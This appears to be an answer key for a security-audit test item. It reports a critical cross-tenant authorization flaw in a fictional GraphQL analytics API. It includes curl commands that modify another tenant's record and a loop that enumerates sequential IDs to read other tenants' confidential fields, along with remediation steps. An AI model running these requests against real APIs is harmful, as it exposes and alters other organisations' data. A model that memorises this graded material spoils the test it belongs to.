# Expected Response

## System
- Domain: Data Analytics / BI
- System: InsightGraph Analytics API
- Example ID: GQL-0095

## Priority Findings

### Finding 1: Predictable Analytics Dataset IDs Enable Cross-Tenant Data Exfiltration (Pattern 1.8)
**Severity:** Critical
**Category:** BOLA / Predictable IDs

**Summary:**
Per §5.0 (Pattern 1.8 — predictable or sequential IDs): The `updateResource` resolver accepts any ID with no tenantId verification. Combined with predictable/sequential IDs, an attacker from `tenant-f455` modified analytics dataset record `R-2095` belonging to `tenant-861b`, injecting `ownerId: "attacker-f455861b"`. By enumerating sequential IDs (R-2093, R-2094, R-2095...), the attacker can systematically access and modify analytics models, dashboards, and proprietary datasets belonging to other organizations.

**Evidence from HAR:**
- Request: `POST https://api.insightgraph-analyt.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-f455`
- Mutation: `updateResource(id: "R-2095", input: {status: "approved", ownerId: "attacker-f455861b"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-861b"`, `sensitiveField: "CONFIDENTIAL-f455861b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f455861b`

## Steps to Reproduce

### Step 1 — Cross-tenant analytics dataset mutation (HAR)
```bash
curl -s -X POST https://api.insightgraph-analyt.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f455" \
  -d '{"query": "mutation { updateResource(id: \"R-2095\", input: {status: \"approved\", ownerId: \"attacker-f455861b\"}) { resourceId status } }"}'
```
**Vulnerable:** Analytics dataset from `tenant-861b` mutated. **Secure:** FORBIDDEN.

### Step 2 — Sequential ID enumeration of analytics records
```bash
for id in R-2094 R-2093 R-2092; do
  curl -s -X POST https://api.insightgraph-analyt.example.com/graphql \
    -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
    -H "Content-Type: application/json" -H "x-tenant-id: tenant-f455" \
    -d "{\"query\": \"query { getResource(id: \\\"$id\\\") { resourceId tenantId data { sensitiveField } } }\"}"
done
```
**Vulnerable:** Sequential IDs return analytics data from different tenants.

## Remediation
1. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`.
3. Use UUIDs (non-sequential) for analytics resource IDs.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
